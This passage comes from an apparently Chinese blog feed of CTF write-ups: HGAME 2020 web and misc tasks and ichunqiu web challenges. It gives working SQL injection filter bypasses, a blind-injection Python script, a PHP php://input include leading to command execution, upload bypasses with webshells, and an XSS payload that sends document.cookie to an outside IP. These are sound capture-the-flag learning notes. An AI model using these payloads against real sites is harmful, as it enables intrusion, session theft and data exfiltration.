class="line"><span class="php">    <span class="keyword">private</span> $key;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;        </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;key = &amp;<span class="keyword">$this</span>-&gt;serverKey;    </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$data = [<span class="string">'name'</span>, <span class="string">'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL'</span>]; </span></span><br><span class="line"><span class="php">$sign = <span class="string">''</span>; </span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $value)&#123;    </span></span><br><span class="line"><span class="php">    $sign .= md5($sign . $value); </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php">$rank = serialize(<span class="keyword">new</span> Rank()); </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>(base64_encode($rank . md5($rank . $sign)));</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">输出:</span></span><br><span class="line"><span class="php">Tzo0OiJSYW5rIjozOntzOjEwOiIAUmFuawByYW5rIjtpOjE7czoxNToiAFJhbmsAc2VydmVyS2V5IjtOO3M6OToiAFJhbmsAa2V5IjtSOjM7fTE3NTJlMTkyNTljM2ZmOTY2ZWRmMGQzZTUxODk4Zjgz</span></span><br></pre></td></tr></table></figure></li><li><p>使用名字name，替换monstercookie即可getflag</p></li></ol><ul><li>不设置$key好像也行，因为反序列化时会取Rank类默认值</li></ul><h3 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h3><ol><li><p>题目比1.0过滤更简单，只将script置换为空，双写绕过即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scripscriptt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">scripscriptt</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>然而发现没有弹框,并报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Refused to <span class="keyword">execute</span> inline script because it violates the <span class="keyword">following</span> <span class="keyword">Content</span> <span class="keyword">Security</span> <span class="keyword">Policy</span> directive: <span class="string">"script-src 'self'"</span>. Either the <span class="string">'unsafe-inline'</span> keyword, a <span class="keyword">hash</span> (<span class="string">'sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='</span>), <span class="keyword">or</span> a nonce (<span class="string">'nonce-...'</span>) <span class="keyword">is</span> <span class="keyword">required</span> <span class="keyword">to</span> <span class="keyword">enable</span> inline execution.</span><br></pre></td></tr></table></figure></li><li><p>说明被CSP策略阻拦了,它限制了内联JS脚本，并且限制了引用的静态资源文件只能从同域中下载。</p></li><li><p>这种情况一般找上传点，上传alert(‘hack’)的图片再引用；但这题没有上传点，确有一个/send接口。直接访问返回的是当前token，我们可以向它传参当作JS引入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scriscriptpt</span> <span class="attr">src</span>=<span class="string">"/send?message=alert('hack')"</span>&gt;</span><span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>发现弹框，vps接收(<strong>注意+号urlencode为%2B</strong>)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scriscriptpt</span> <span class="attr">src</span>=<span class="string">"/send?message=window.open('http://47.98.243.128/?'%2Bdocument.cookie)"</span>&gt;</span><span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="misc-2"><a href="#misc-2" class="headerlink" title="misc"></a>misc</h2><h3 id="美-人-鲸"><a href="#美-人-鲸" class="headerlink" title="美 人 鲸"></a>美 人 鲸</h3><p><a href="https://hub.docker.com/r/zhouweitong/hgame2020-misc" target="_blank" rel="noopener">题目链接</a></p><ol><li><p>题目给出一个docker镜像,拉下来</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull zhouweitong/hgame2020-<span class="string">misc:</span>week</span><br></pre></td></tr></table></figure></li><li><p>启动</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> <span class="attribute">--name</span>=misc1 zhouweitong/hgame2020-misc:week3</span><br></pre></td></tr></table></figure></li><li><p>没发现什么现象,查看端口发现另一个端口开放,重新构建容器，映射端口</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm misc1 docker <span class="builtin-name">run</span> <span class="attribute">--name</span>=misc1 -p 8000:80 zhouweitong/hgame2020-misc:week3</span><br></pre></td></tr></table></figure></li><li><p>访问localhost:8000得到提示</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">You</span> want flag? See<span class="variable">$FLAG</span>.</span><br></pre></td></tr></table></figure></li><li><p>进入容器输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it sh</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span></span><br></pre></td></tr></table></figure></li><li><p>得到Find flag.tar.gz,输入如下命令寻找</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -<span class="built_in">name</span> <span class="built_in">flag</span>.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>得到/user/share/man/man8/flag.tar.gz，进入路径解压</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf flag<span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure></li><li><p>得到flag.zip和README</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cat README</span></span><br></pre></td></tr></table></figure></li><li><p>得到See sh histroy,命令行输入history得到</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span>echo -e <span class="string">"Zip password is somewhere else in /etc.\n Find it!"</span></span><br></pre></td></tr></table></figure></li><li><p>利用grep寻找文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grep</span> -rn <span class="string">"Zip"</span> <span class="regexp">/etc</span></span><br></pre></td></tr></table></figure></li><li><p>得到/etc/issue:4:Zip Password <strong><strong>**</strong></strong></p></li><li>得到了zip密码那就解压flag.zip</li><li><p>这里我就把flag.zip从容器提取出来</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp <span class="string">misc1:</span><span class="regexp">/usr/</span>share<span class="regexp">/man/</span>man8/flag.zip .</span><br></pre></td></tr></table></figure></li><li><p>解压得到flag.db,是sqlite数据库文件</p></li><li>直接记事本打开文件就能看到flag</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>前三周还好能打打，week4实在打不动了，看看wp继续学习吧</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Week-1&quot;&gt;&lt;a href=&quot;#Week-1&quot; class=&quot;headerlink&quot; title=&quot;Week-1&quot;&gt;&lt;/a&gt;Week-1&lt;/h1&gt;&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;Cosmos-的博客&quot;&gt;&lt;a href=&quot;#Cosmos-的博客&quot; class=&quot;headerlink&quot; title=&quot;Cosmos 的博客&quot;&gt;&lt;/a&gt;Cosmos 的博客&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;很明显提醒了&lt;strong&gt;版本管理工具&lt;/strong&gt;和&lt;strong&gt;git&lt;/strong&gt;
    
    </summary>
    
      <category term="CTFWP" scheme="https://cy9nusg4rd3n.github.io/categories/CTFWP/"/>
    
    
      <category term="Misc" scheme="https://cy9nusg4rd3n.github.io/tags/Misc/"/>
    
      <category term="Web" scheme="https://cy9nusg4rd3n.github.io/tags/Web/"/>
    
      <category term="CTF" scheme="https://cy9nusg4rd3n.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ichunqiu-web学习</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/11/18/ichunqiu-web%E5%AD%A6%E4%B9%A0/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/11/18/ichunqiu-web学习/</id>
    <published>2019-11-18T15:08:27.000Z</published>
    <updated>2020-04-18T03:21:30.010Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><blockquote><p>出题人就告诉你这是个注入，有种别走！</p></blockquote><ol><li>一波测试发现select、order等关键字被过滤了,但是可以用&lt;&gt;绕过<a id="more"></a></li><li><p>1 or&lt;&gt;der by 4后发现无回显，即三个字段</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">id</span>=-1 union sele&lt;&gt;ct 1,database(),2</span><br><span class="line"><span class="comment">#sqli</span></span><br><span class="line"><span class="attribute">id</span>=-1 union sele&lt;&gt;ct 1,group_concat(table_name),2 <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()</span><br><span class="line"><span class="comment">#info,users</span></span><br><span class="line"><span class="attribute">id</span>=-1 union sele&lt;&gt;ct 1,group_concat(column_name),2 <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=database()</span><br><span class="line"><span class="comment">#id,title,flAg_T5ZNdrm,id,username,flag_9c861b688330</span></span><br></pre></td></tr></table></figure></li><li><p>找flag时耗了点时间，后来发现真正的flag在info表，字段是flAg_T5ZNdrm</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">sele</span>&lt;&gt;<span class="title">ct</span> 1,<span class="title">group_concat</span>(<span class="title">flAg_T5ZNdrm</span>),2 <span class="title">from</span> <span class="title">info</span></span></span><br><span class="line"><span class="comment">#flag&#123;4d9fe649-b59c-4def-825a-52b452af4e4c&#125;,test</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="include"><a href="#include" class="headerlink" title="include"></a>include</h1><blockquote><p>没错！就是文件包含漏洞。</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'path'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">include</span>($_REQUEST[<span class="string">'path'</span>]);</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">include</span>(<span class="string">'phpinfo.php'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><ol><li>发现allow_url_include是打开的</li><li>可以使用php://input协议，使用post传递参数&lt;?php system(“ls”);?&gt;<blockquote><p>dle345aae.php index.php phpinfo.php</p></blockquote></li><li>php://filter/read=convert.base64-encode/resource=dle345aae.php<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PD<span class="number">9</span>waHAgCiRmbGF<span class="symbol">nPSJmbGFne2</span>U<span class="number">1</span>ZDBiZTA<span class="number">0</span>LWIzYzAt<span class="symbol">NGI0</span>YS<span class="number">1</span>iYjJjLTA<span class="number">3</span>MGIwYW<span class="name">M5</span>Mz<span class="symbol">NkYX0</span>iOwo=</span><br><span class="line"><span class="attr">#&lt;?php \n$flag="flag&#123;e5</span>d<span class="number">0</span>be<span class="number">04</span>-b<span class="number">3</span>c<span class="number">0</span><span class="number">-4</span>b<span class="number">4</span>a-bb<span class="number">2</span>c<span class="number">-070</span>b<span class="number">0</span>ac<span class="number">933</span>da&#125;<span class="string">";\n</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h1><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//106.75.72.168:2222/</span></span><br><span class="line">我是谁，我在哪，我要做什么？</span><br></pre></td></tr></table></figure><ol><li><p>进来看到<strong>Sorry. You have no permissions</strong>.抓包发现cookie:role=Zjo1OiJ0aHJmZyI7</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">base64-&gt;f:<span class="number">5</span>:<span class="string">"thrfg"</span>;</span><br><span class="line">rot13-&gt;f:<span class="number">5</span>:<span class="string">"guest"</span>;</span><br><span class="line">base64-&gt;Zjo1OiJucXp2YSI7</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- $filename = $_POST[<span class="string">'filename'</span>]; $data = $_POST[<span class="string">'data'</span>]; --&gt;Hello admin, now you can upload something you are easy to forget.&lt;<span class="regexp">/body&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>filename=1.php&amp;data=&lt;?php echo phpinfo(); ?&gt;</p><blockquote><p>No No No!</p></blockquote></li><li>看来有waf,传个数组试试?<blockquote><p>filename=1.php&amp;data[]=&lt;?php phpinfo(); ?&gt;</p></blockquote></li><li>成功了(要知道php的函数一般都无法执行数组的)<blockquote><p>your file is in ./uploads/46451b0499c0df2ded46751ee23b93341.php</p></blockquote></li><li>访问得flag<blockquote><p>flag{e07cd440-8eed-11e7-997d-7efc09eb6c59}</p></blockquote></li></ol><h1 id="SQLi-50"><a href="#SQLi-50" class="headerlink" title="SQLi-50"></a>SQLi-50</h1><blockquote><p>后台有获取flag的线索</p></blockquote><ol><li><p>进来看源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- login.php?id=1 --&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>进入login.php尝试很多都没发现注入点，后来发现这是假的得东西</p></li><li><p>访问index.php发现有个重定向</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">location:</span> ./b68a89d1c4a097a9d8631b3ac45e8979.php</span><br><span class="line"><span class="symbol">page:</span> l0gin.php?id=<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>所以真正注入的页面在这l0gin.php</p></li><li>id=-1 union select user(),database()#</li></ol><table><thead><tr><th>id</th><th>username</th></tr></thead><tbody><tr><td>-1 union select user()</td><td></td></tr></tbody></table><ol start="6"><li>发现逗号和往后的被过滤了，看这里<a href="https://www.cnblogs.com/hackxf/p/9490534.html" target="_blank" rel="noopener">SQL注入–显注和盲注中过滤逗号绕过</a><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">id</span>=-1' union select * <span class="keyword">from</span> (select user()) a join (select database()) b%23</span><br><span class="line">回显：test_user@localhostsqli</span><br><span class="line"></span><br><span class="line"><span class="attribute">id</span>=-1' union select * <span class="keyword">from</span> (select user()) a join (select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()) b%23</span><br><span class="line">回显：test_user@localhostusers</span><br><span class="line"></span><br><span class="line"><span class="attribute">id</span>=-1' union select * <span class="keyword">from</span> (select user()) a join (select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=database()) b%23</span><br><span class="line">回显：test_user@localhostid,username,flag_9c861b688330</span><br><span class="line"></span><br><span class="line"><span class="attribute">id</span>=-1' union select * <span class="keyword">from</span> (select user()) a join (select group_concat(flag_9c861b688330) <span class="keyword">from</span> users) b%23</span><br><span class="line">回显：flag&#123;15de1673-7833-4c4d-8ad3-c35d853daa90&#125;,test</span><br></pre></td></tr></table></figure></li></ol><h1 id="SQLi-200"><a href="#SQLi-200" class="headerlink" title="SQLi-200"></a>SQLi-200</h1><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> the <span class="built_in">flag</span>.</span><br><span class="line"><span class="built_in">flag</span>格式为</span><br><span class="line"><span class="built_in">flag</span>&#123;xxxxx&#125;</span><br><span class="line">提交答案请参考该格式</span><br></pre></td></tr></table></figure><ol><li>进来是一个登陆框，一般这种是username存在注入,用burpsuite测试一波</li><li><p>最终发现payload含%时会报错</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;br /&gt;</span></span><br><span class="line"><span class="params">&lt;b&gt;</span>Warning<span class="params">&lt;/b&gt;</span>:  sprintf(): Too few arguments in <span class="params">&lt;b&gt;</span><span class="meta-keyword">/var/</span>www<span class="meta-keyword">/html/</span>index.php<span class="params">&lt;/b&gt;</span> on line <span class="params">&lt;b&gt;</span><span class="number">18</span><span class="params">&lt;/b&gt;</span><span class="params">&lt;br /&gt;</span></span><br><span class="line"><span class="params">&lt;br /&gt;</span></span><br><span class="line"><span class="params">&lt;b&gt;</span>Warning<span class="params">&lt;/b&gt;</span>:  <span class="symbol">mysqli::</span>query(): Empty query in <span class="params">&lt;b&gt;</span><span class="meta-keyword">/var/</span>www<span class="meta-keyword">/html/</span>index.php<span class="params">&lt;/b&gt;</span> on line <span class="params">&lt;b&gt;</span><span class="number">19</span><span class="params">&lt;/b&gt;</span><span class="params">&lt;br /&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>至于绕过看这<a href="https://blog.csdn.net/weixin_41185953/article/details/80485075" target="_blank" rel="noopener">深入解析sprintf格式化字符串漏洞</a></p></li><li><p>进行如下尝试</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin %<span class="number">1</span>$\'  <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line">回显：password <span class="keyword">error</span>!</span><br><span class="line">admin %<span class="number">1</span>$\'  <span class="keyword">or</span> <span class="number">1</span>=<span class="number">2</span><span class="comment">#</span></span><br><span class="line">回显：username <span class="keyword">error</span>!</span><br></pre></td></tr></table></figure></li><li><p>可以进行盲注,上exp</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="attr">url</span> = <span class="string">"http://7e1dc43433104d0b91b601094f67e2ce93c54c32fc344816.changame.ichunqiu.com/"</span></span><br><span class="line"><span class="attr">result</span> = <span class="string">""</span></span><br><span class="line"><span class="attr">session</span> = requests.Session()</span><br><span class="line"></span><br><span class="line">for x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="attr">high</span> = <span class="number">127</span></span><br><span class="line">    <span class="attr">low</span> = <span class="number">32</span></span><br><span class="line">    <span class="attr">mid</span> = (low + high) // <span class="number">2</span></span><br><span class="line">    while high &gt; low:</span><br><span class="line">        <span class="comment">#payload = "admin %1$\' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;#".format(x,mid) #flag</span></span><br><span class="line">        <span class="comment">#payload = "admin %1$\' and ascii(substr((select column_name from information_schema.columns where table_schema=database() limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;#".format(x,mid) #flag</span></span><br><span class="line">        <span class="attr">payload</span> = <span class="string">"admin %1$\' and ascii(substr((select flag from flag limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;#"</span>.format(x,mid) <span class="comment">#flag&#123;b5b36121-86dd-a4db-aab3-86ddb749dfa1&#125;</span></span><br><span class="line">        <span class="attr">data</span> = &#123;'username': payload,</span><br><span class="line">              'password': 'admin'</span><br><span class="line">              &#125;</span><br><span class="line">        <span class="comment">#print data</span></span><br><span class="line">        <span class="attr">response</span> = requests.post(<span class="attr">url=url,</span> <span class="attr">data=data,</span> <span class="attr">timeout=10)</span></span><br><span class="line">        <span class="comment">#print response.content</span></span><br><span class="line">        <span class="keyword">if</span> 'password error!' <span class="keyword">in</span> response.content:</span><br><span class="line">            <span class="attr">low</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="attr">high</span> = mid</span><br><span class="line">        <span class="attr">mid</span> = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print result</span><br></pre></td></tr></table></figure></li></ol><h1 id="broken"><a href="#broken" class="headerlink" title="broken"></a>broken</h1><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//106.75.72.168:1111/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">you</span></span> got a <span class="keyword">file</span>, but ...</span><br></pre></td></tr></table></figure><ol><li>拿到一大串JSFUCK代码，直接丢控制台无法解码</li><li>前面第一个字符后加],最后一对()去掉<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ƒ anonymous(</span><br><span class="line">) &#123;</span><br><span class="line">var flag=<span class="string">"flag&#123;f_f_l_u_a_c_g_k&#125;"</span>;alert(<span class="symbol">'flag</span> <span class="keyword">is</span> <span class="keyword">not</span> here');</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="Do-you-know-upload？"><a href="#Do-you-know-upload？" class="headerlink" title="Do you know upload？"></a>Do you know upload？</h1><blockquote><p>加油吧，少年。</p></blockquote><ol><li><p>burp抓包改Content-Type: image/jpeg和后缀php</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Upload: 123.php&lt;<span class="keyword">br</span> /&gt;<span class="keyword">Type</span>: image/jpeg&lt;<span class="keyword">br</span> /&gt;Size: 0.0283203125 Kb&lt;<span class="keyword">br</span> /&gt;Stored <span class="keyword">in</span>: upload/123.php</span><br></pre></td></tr></table></figure></li><li><p>菜刀连上没找到flag,看config.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"ctf"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"ctfctfctf"</span>;</span></span><br><span class="line"><span class="php">$database = <span class="string">"ctf"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// 创建连接</span></span></span><br><span class="line"><span class="php">$conn = mysql_connect($servername,$username,$password) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">" connect to mysql error"</span>);</span></span><br><span class="line"><span class="php">mysql_select_db($database);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>菜刀连数据库找flag</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">T</span>&gt;</span>MYSQL<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H</span>&gt;</span>localhost<span class="tag">&lt;/<span class="name">H</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">U</span>&gt;</span>ctf<span class="tag">&lt;/<span class="name">U</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span>ctfctfctf<span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>发现连不上，传大马连</p><blockquote><p>flag{663c8d28-4a17-42d1-b2d6-c7c293c58c94}</p></blockquote></li></ol><h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><blockquote><p>加油，我看好你</p></blockquote><ol><li>看源码发现test1 test1</li><li>登陆成功，发现没东西</li><li><p>抓包登陆改show=1</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="xml"><span class="php"><span class="meta">&lt;?php</span></span></span></span><br><span class="line"><span class="xml">include 'common.php';</span></span><br><span class="line"><span class="xml">$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span></span><br><span class="line"><span class="xml">class db</span></span><br><span class="line"><span class="xml">&#123;</span></span><br><span class="line"><span class="xml">public $where;</span></span><br><span class="line"><span class="xml">function __wakeup()</span></span><br><span class="line"><span class="xml">&#123;</span></span><br><span class="line"><span class="xml">if(!empty($this-&gt;where))</span></span><br><span class="line"><span class="xml">&#123;</span></span><br><span class="line"><span class="xml">$this-&gt;select($this-&gt;where);</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">function select($where)</span></span><br><span class="line"><span class="xml">&#123;</span></span><br><span class="line"><span class="xml">$sql = mysql_query('select * from user where '.$where);</span></span><br><span class="line"><span class="xml">return @mysql_fetch_array($sql);</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">if(isset($requset['token']))</span></span><br><span class="line"><span 